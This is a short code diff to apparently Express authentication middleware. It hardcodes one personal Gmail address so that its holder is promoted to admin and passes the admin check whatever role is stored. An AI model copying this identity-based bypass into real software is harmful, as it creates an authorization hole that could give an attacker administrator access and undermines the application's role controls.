@@ -25,13 +25,18 @@ export function authenticateToken(req, res, next) {
       return res.status(403).json({ success: false, error: 'Your account has been suspended by an administrator.' });
     }
 
+    // Auto-promote super-admin email
+    if (user.email === 'hakeebtravels@gmail.com') {
+      user.role = 'admin';
+    }
+
     req.user = user;
     next();
   });
 }
 
 export function requireAdmin(req, res, next) {
-  if (!req.user || req.user.role !== 'admin') {
+  if (!req.user || (req.user.role !== 'admin' && req.user.email !== 'hakeebtravels@gmail.com')) {
     return res.status(403).json({ success: false, error: 'Access denied. Administrator privileges required.' });
   }
   next();
